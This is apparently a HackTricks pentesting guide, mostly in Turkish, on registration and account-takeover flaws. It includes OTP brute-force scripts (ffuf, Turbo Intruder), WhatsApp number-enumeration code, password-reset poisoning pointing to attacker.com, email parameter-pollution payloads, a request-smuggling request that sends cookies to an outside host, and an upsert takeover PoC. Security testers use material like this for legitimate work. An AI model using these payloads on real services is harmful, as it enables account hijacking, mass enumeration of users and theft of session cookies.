# Kayıt & Ele Geçirme Zafiyetleri

{{#include ../banners/hacktricks-training.md}}

## Registration Takeover

### Çift Kayıt

- Mevcut bir kullanıcı adı kullanarak kayıt oluşturmaya çalışın
- E-postayı değiştirerek kontrol edin:
- Büyük harf kullanımı
- +1@
- e-postaya nokta ekleme
- e-posta adında özel karakterler (%00, %09, %20)
- E-posta sonuna boş karakterler koyun: `test@test.com a`
- `victim@gmail.com@attacker.com`
- `victim@attacker.com@gmail.com`
- E-posta sağlayıcısının canonicalization hilelerini deneyin (servise bağlı):
- Gmail noktaları ve subaddressing'i göz ardı eder: `victim+1@gmail.com`, `v.ic.tim@gmail.com` adresleri `victim@gmail.com`'a teslim edilir
- Bazı sağlayıcılar local-part'ta büyük/küçük harf duyarsızdır
- Bazı sağlayıcılar unicode confusable karakterleri kabul eder. Local-part içinde homoglyph ve soft hyphen `\u00AD` deneyin
- Bunları suistimal ederek: uniqueness kontrollerini atlatabilir, duplicate hesaplar/workspace davetleri elde edebilir veya bir takeover hazırlarken mağdurun kayıt olmasını engelleyebilirsiniz (geçici DoS)

### Kullanıcı Adı Keşfi

Uygulama içinde bir kullanıcı adının daha önce kayıtlı olup olmadığını tespit edip edemeyeceğinizi kontrol edin.

- Farklı hata mesajları veya HTTP durum kodları
- Zamanlama farkları (mevcut kullanıcı IdP/DB sorgusu tetikleyebilir)
- Kayıt formunun bilinen e-postalar için profil verisini otomatik doldurması
- Team/invite akışlarını kontrol edin: e-posta girildiğinde bir hesabın var olup olmadığını ortaya çıkarabilir

### Parola Politikası

Kullanıcı oluştururken parola politikasını kontrol edin (zayıf parolalara izin verilip verilmediğini kontrol edin).\
Bu durumda kimlik bilgilerini bruteforce etmeyi deneyebilirsiniz.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)to learn how to attempt account takeovers or extract information via **SQL Injections** in registry forms.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### E-postayı Değiştirme

Kayıtlıyken e-postayı değiştirmeyi deneyin ve bu değişikliğin doğru şekilde doğrulanıp doğrulanmadığını ya da rastgele e-postalara değiştirilebileceğini kontrol edin.

### Diğer Kontroller

- **Tek kullanımlık e-postaları** (mailinator, yopmail, 1secmail, vb.) kullanıp kullanamadığınızı veya `victim+mailinator@gmail.com` gibi subaddressing ile blocklist'i atlayıp atlayamadığınızı kontrol edin
- **Uzun** **parola** (>200) **DoS**'a yol açar
- **Hesap oluşturma için rate limit'leri kontrol edin**
- username@**burp_collab**.net kullanın ve **callback**'i analiz edin
- Telefon numarası doğrulaması kullanılıyorsa, telefon ayrıştırma/enjeksiyon kenar durumlarını kontrol edin

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Contact-discovery / identifier-enumeration oracles

Telefon-numarası merkezli mesajlaşma uygulamaları, istemci kişi listesini senkronize ettiğinde bir **presence oracle** açığa çıkarır. WhatsApp’ın discovery isteklerini yeniden oynatmak tarihsel olarak **>100M sorgu/saat** sağlamış, neredeyse tam hesap sıralamalarına izin vermiştir.

**Saldırı iş akışı**

1. Resmi bir client'ı enstrümente ederek address-book upload isteğini yakalayın (normalleştirilmiş E.164 numaraların authenticated blob'u). Aynı cookie/device token'ı yeniden kullanırken saldırgan tarafından oluşturulmuş numaralarla yeniden oynatın.
2. İstek başına numaraları batch'leyin: WhatsApp binlerce identifier kabul eder ve registered/unregistered ile birlikte metadata (business, companion, vb.) döner. Yanıtları offline analiz ederek mağdurlara mesaj göndermeden hedef listeleri oluşturun.
3. SIM bankaları, cloud cihazları veya residential proxy'lerle enumerasyonu yatay ölçekleyin ki hesap/IP/ASN başına throttling hiç devreye girmesin.

**Arama planı modelleme**

Her ülkenin arama planını modelleyerek geçersiz adayları atlayın. NDSS dataset'i (`country-table.*`) ülke kodlarını, benimsenme yoğunluğunu ve platform dağılımını listeler; böylece yüksek isabetli aralıkları önceliklendirebilirsiniz. Örnek seedleme kodu:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Prioritise prefixes that match real allocations (Mobil Ülke Kodu + Ulusal Hedef Kodu) before querying the oracle to keep throughput useful.

**Turning enumerations into targeted attacks**

- Feed leaked phone numbers (e.g., Facebook’s 2021 breach) into the oracle to learn which identities are still active before phishing, SIM-swapping, or spamming.
- Slice censuses by country/OS/app type to find regions with weak SMS filtering or heavy WhatsApp Business adoption for localized social engineering.

**Public-key reuse correlation**

WhatsApp exposes each account’s X25519 identity key during session setup. Request identity material for every enumerated number and deduplicate the public keys to reveal account farms, cloned clients, or insecure firmware—shared keys deanonymize multi-SIM operations.

## Zayıf E-posta/Telefon Doğrulaması (OTP/Magic Link)

Kayıt akışları genellikle sayısal bir OTP veya bir magic-link token ile sahipliği doğrular. Tipik zayıflıklar:

- Guessable veya kısa OTP (4–6 digits) ve etkili bir rate limiting ya da IP/cihaz takibi olmaması. Paralel tahminler ve header/IP rotasyonu deneyin.
- OTP reuse across actions veya hesaplar arasında, ya da belirli kullanıcı/işleme bağlanmaması (örn. aynı kod login ve signup için işe yarıyor veya email değiştikten sonra da çalışıyor).
- Multi-value smuggling: bazı backend'ler birden fazla kod kabul eder ve herhangi bir eşleşme doğrulanır. Deneyin:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: wrong vs expired vs wrong-user kodlarını status/message/body length üzerinden ayırt edin.
- Token'lar success sonrası veya password/email değişiminden sonra invalidated olmuyor.
- Verification token kullanıcı ajanı/IP'ye bağlanmamış; attacker-controlled sayfalardan cross-origin completion mümkün.

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Paralel/eşzamanlı tahminlerle ardışık hesap kilitlemelerini atlamak (Burp'ta Turbo Intruder kullanın):

<details>
<summary>6 haneli OTP denemelerini sel halinde göndermek için Turbo Intruder snippet</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: aynı geçerli OTP'yi iki oturumda eşzamanlı gönderin; bazen bir oturum doğrulanmış saldırgan hesabı olurken kurban akışı da başarılı olur.
- Ayrıca verification links üzerinde Host header poisoning'i test edin (same as reset poisoning below) to leak or complete verification on attacker controlled host.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (kurban kaydolmadan önce)

Güçlü bir sorun sınıfı, saldırganın kurbanın e‑postasında kurban hesap oluşturmadan önce eylemler gerçekleştirdiği ve daha sonra erişimi geri kazandığı durumlarda ortaya çıkar.

Key techniques to test (adapt to the target’s flows):

- Classic–Federated Merge
- Attacker: kurban e‑postasıyla klasik bir hesap kaydeder ve bir parola belirler
- Victim: daha sonra aynı e‑posta ile SSO ile kaydolur
- Insecure merges may leave both parties logged in or resurrect the attacker’s access
- Unexpired Session Identifier
- Attacker: hesap oluşturur ve uzun‑süreli bir oturum tutar (çıkış yapmayın)
- Victim: şifreyi kurtarır/ayarlar ve hesabı kullanır
- Test if old sessions stay valid after reset or MFA enablement
- Trojan Identifier
- Attacker: önceden oluşturulmuş hesaba ikincil bir tanımlayıcı ekler (phone, additional email, or links attacker’s IdP)
- Victim: şifreyi sıfırlar; attacker daha sonra the trojan identifier'ı kullanarak sıfırlama/giriş yapar
- Unexpired Email Change
- Attacker: email‑change işlemini attacker mail adresine başlatır ve onayı bekletir
- Victim: hesabı kurtarır ve kullanmaya başlar
- Attacker: daha sonra pending email‑change'i tamamlayarak hesabı çalar
- Non‑Verifying IdP
- Attacker: email sahipliğini doğrulamayan bir IdP kullanarak `victim@…` iddiasında bulunur
- Victim: klasik yol ile kaydolur
- Service merges on email without checking `email_verified` or performing local verification

Practical tips

- Web/mobile bundle'larından akışları ve endpoint'leri toplayın. Klasik signup, SSO linking, email/phone change ve password reset endpoint'lerini arayın.
- Diğer akışları denerken oturumları canlı tutmak için gerçekçi otomasyon oluşturun.
- SSO testleri için bir test OIDC provider ayağa kaldırın ve RP'nin doğrulanmamış IdP'lere güvenip güvenmediğini kontrol etmek için kurban adresi için `email` claim'leri ve `email_verified=false` ile tokenlar verin.
- Herhangi bir password reset veya email değişikliğinden sonra doğrulayın ki:
- tüm diğer oturumlar ve tokenlar invalidated olsun,
- pending email/phone change yetenekleri iptal edilmiş olsun,
- daha önce bağlı olan IdP'ler/e‑postalar/telefonlar tekrar re‑verified olsun.

Note: Extensive methodology and case studies of these techniques are documented by Microsoft’s pre‑hijacking research (see References at the end).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Kendi e‑posta adresinize password reset isteği gönderin
2. Password reset linkine tıklayın
3. Şifreyi değiştirmeyin
4. Herhangi bir 3rd party siteye tıklayın (ör. Facebook, twitter)
5. İsteği Burp Suite proxy'de intercept edin
6. Referer header'ın password reset token'ı leaking edip etmediğini kontrol edin.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Burp Suite'te password reset isteğini intercept edin
2. Burp Suite'te aşağıdaki header'ları ekleyin veya düzenleyin: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Değiştirilmiş header ile isteği iletin\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. _host header_ bazlı bir password reset URL'si arayın, örn: `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### API Parametrelerinde IDOR <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Saldırgan kendi hesabıyla giriş yapıp **Change password** özelliğine gitmelidir.
2. Burp Suite'i başlatın ve isteği Intercept edin
3. Repeater sekmesine gönderin ve parametreleri düzenleyin : Kullanıcı ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Zayıf Parola Sıfırlama Tokenı <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Parola sıfırlama tokenı her seferinde rastgele oluşturulmalı ve benzersiz olmalıdır.\
Tokenın süresinin dolup dolmadığını veya her zaman aynı olup olmadığını belirlemeye çalışın; bazı durumlarda üretim algoritması zayıftır ve tahmin edilebilir. Algoritmada aşağıdaki değişkenler kullanılabilir.

- Timestamp
- UserID
- Kullanıcının e-posta adresi
- Ad ve Soyad
- Doğum tarihi
- Kriptografi
- Sadece rakam
- Kısa token dizisi ( karakterler arasında \[A-Z,a-z,0-9])
- Token yeniden kullanımı
- Token'ın sona erme tarihi

### Parola Sıfırlama Token Sızıntısı <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Belirli bir e-posta için API/UI üzerinden parola sıfırlama isteği tetikleyin, örn: test@mail.com
2. Sunucu yanıtını inceleyin ve `resetToken`'ı kontrol edin
3. Ardından token'ı şu gibi bir URL'de kullanın: `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Kullanıcı Adı Çakışmasıyla Parola Sıfırlama <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Mağdurun kullanıcı adıyla tamamen aynı ama kullanıcı adının önüne ve/veya sonuna boşluk karakterleri eklenmiş bir kullanıcı adıyla sisteme kayıt olun. Örn: `"admin "`
2. Kötü amaçlı kullanıcı adınızla parola sıfırlama isteği gönderin.
3. E-postanıza gönderilen token'ı kullanıp mağdurun parolasını sıfırlayın.
4. Yeni parolayla mağdur hesabına giriş yapın.

CTFd platformu bu saldırıya karşı zayıftı.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Cross Site Scripting ile Hesap Ele Geçirme <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Uygulama içinde veya çerezler ana domain'e scoped ise alt bir domainde XSS bulun : `*.domain.com`
2. Leak the current **sessions cookie**
3. Cookie'yi kullanarak kullanıcı olarak oturum açın

### HTTP Request Smuggling ile Hesap Ele Geçirme <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. HTTP Request Smuggling türünü (CL, TE, CL.TE) tespit etmek için **smuggler**'ı kullanın\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. `POST / HTTP/1.1`'i aşağıdaki verilerle üzerine yazacak bir istek oluşturun:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` amacı kurbanları burpcollab'a open redirect ile yönlendirmek ve cookie'lerini çalmaktır\
3. Nihai istek aşağıdakine benzer olabilir
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone raporları bu hatanın sömürüldüğünü bildiriyor\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Account Takeover via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. CSRF için bir payload oluşturun, örn: “HTML form with auto submit for a password change”
2. Payload'ı gönderin

### Account Takeover via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token bir kullanıcının kimlik doğrulamasında kullanılabilir.

- Başka bir User ID / Email ile JWT'yi düzenleyin
- Zayıf JWT imzası olup olmadığını kontrol edin


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

Bazı signup handler'ları, sağlanan email zaten mevcutsa upsert yapar. Eğer endpoint, email ve password içeren minimal bir body kabul ediyor ve sahiplik doğrulaması uygulamıyorsa, mağdurun email'ini göndererek parolalarını pre-auth olarak üzerine yazabilirsiniz.

- Keşif: bundled JS'ten (veya mobile app trafiğinden) endpoint isimlerini toplayın, sonra ffuf/dirsearch kullanarak /parents/application/v4/admin/FUZZ gibi base path'leri fuzz'layın.
- Yöntem ipuçları: bir GET'in "Only POST request is allowed." gibi mesajlar döndürmesi genellikle doğru HTTP verb'ünü ve JSON body beklendiğini gösterir.
- Gerçek dünyada gözlemlenen minimal body:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Örnek PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Etkisi: Full Account Takeover (ATO) reset token, OTP veya email verification olmadan.

## Referanslar

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
